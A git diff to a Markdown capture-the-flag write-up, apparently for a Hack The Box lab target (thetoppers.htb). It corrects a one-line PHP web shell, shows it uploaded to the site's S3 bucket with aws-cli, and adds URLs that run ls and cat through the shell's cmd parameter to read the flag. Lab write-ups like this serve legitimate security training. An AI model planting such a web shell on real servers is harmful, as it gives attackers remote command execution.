@@ -78,7 +78,7 @@ Listing the bucket we can see that the web page uses PHP lenguaje.
 There is another feature on aws-cli which allows to upload a file. Knowing we are dealing with php:
 
 ```
-cho '<?php system($_GET["cmd"]); ?>' > shell.php
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
 ```
 
 then
@@ -90,9 +90,16 @@ aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
 Now we can use the parameter `cmd`:
 
 ![alt text](./img/cmd.png)
+ 
+ Now, knowing where the flag is:
 
-The next step would be using a revershell to access the machine.
+ ```
+ http://thetoppers.htb/shell.php?cmd=ls+..
+ ```
 
-![alt text](image.png)
+ ![alt text](./img/flag.png)
 
-After reloading the web page with this new file...
+ ```
+ http://thetoppers.htb/shell.php?cmd=cat+../flag.txt
+ ```
+ And there is the flag.
